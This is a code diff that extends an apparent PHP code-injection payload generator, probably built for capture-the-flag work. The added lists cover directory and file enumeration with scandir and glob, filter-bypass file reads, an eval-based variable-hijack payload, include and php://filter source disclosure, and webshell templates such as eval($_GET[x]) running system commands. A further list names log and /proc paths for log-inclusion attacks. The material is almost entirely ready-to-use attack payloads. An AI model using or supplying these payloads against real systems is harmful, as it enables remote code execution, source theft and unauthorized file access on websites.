@@ -30,6 +30,8 @@ READFILE_TEMPLATES = [
     "show_source('{path}')",
     "highlight_file('{path}')",
     "readgzfile('{path}')",
+    "vi {path}",
+    "grep '{keyword}' {path}",
 ]
 
 READ_ENV_TEMPLATES = [
@@ -55,6 +57,42 @@ PHPINFO_TEMPLATES = [
     "print_r(getallheaders());",
     "show_source(scandir(getcwd())[2]);",
     "show_source(current(array_reverse(scandir(getcwd()))));",
+]
+
+# Directory enumeration payloads extracted from eg.md.
+# These focus on nested function composition for path traversal-like listing.
+DIRECTORY_ENUM_TEMPLATES = [
+    "print_r(scandir('/'));",
+    "var_dump(scandir('/'));",
+    "var_export(scandir('/'));",
+    "echo(implode('--',scandir('/')));",
+    "echo json_encode(scandir('/'));",
+    "print_r(scandir(dirname(__FILE__)));",
+    "print_r(scandir(dirname(__DIR__)));",
+    "print_r(scandir(dirname(dirname(__FILE__))));",
+    "print_r(scandir(dirname(dirname(__DIR__))));",
+    "print_r(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
+    "var_dump(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
+    "var_export(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
+    "echo(implode('--',scandir(dirname(dirname(dirname(dirname(__DIR__)))))));",
+    "echo json_encode(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
+    "var_export(glob('*'));",
+    "var_export(glob('../*'));",
+    "var_export(glob('../../*'));",
+    "var_export(glob('../../../*'));",
+]
+
+# File selection payloads for scenarios where [] indexing is filtered.
+FILE_ENUM_TEMPLATES = [
+    "show_source(next(array_reverse(scandir(getcwd()))));",
+    "echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));",
+    "echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));",
+]
+
+# Variable scope hijacking payload:
+# attacker places executable code into POST values, then eval fetches and executes it.
+VARIABLE_HIJACK_TEMPLATES = [
+    "eval(array_pop(next(get_defined_vars())));",
 ]
 
 # Space Bypass Templates
@@ -94,4 +132,31 @@ SHORT_TAG_TEMPLATES = [
 BACKTICK_TEMPLATES = [
     "`{path}`",
     "`cat {path}`",
+]
+
+# Include Templates
+INCLUDE_TEMPLATES = [
+    "include $_GET[x];&x=php://filter/read=convert.base64-encode/resource={path}",
+    "include('{path}');",
+    "require('{path}');",
+    "include_once('{path}');",
+    "require_once('{path}');",
+]
+
+# Webshell Templates (Param Exec)
+WEBSHELL_TEMPLATES = [
+    "eval($_GET[x]);&x=system('{cmd}');",
+    "assert($_POST[x]);",
+    "call_user_func($_GET[x], $_GET[y]);",
+]
+
+# Log Inclusion Templates
+LOG_INCLUSION_TEMPLATES = [
+    "/var/log/nginx/access.log",
+    "/var/log/apache2/access.log",
+    "/var/log/httpd/access_log",
+    "/proc/self/environ",
+    "/proc/self/fd/0",
+    "/proc/self/fd/1",
+    "/proc/self/fd/2",
 ]
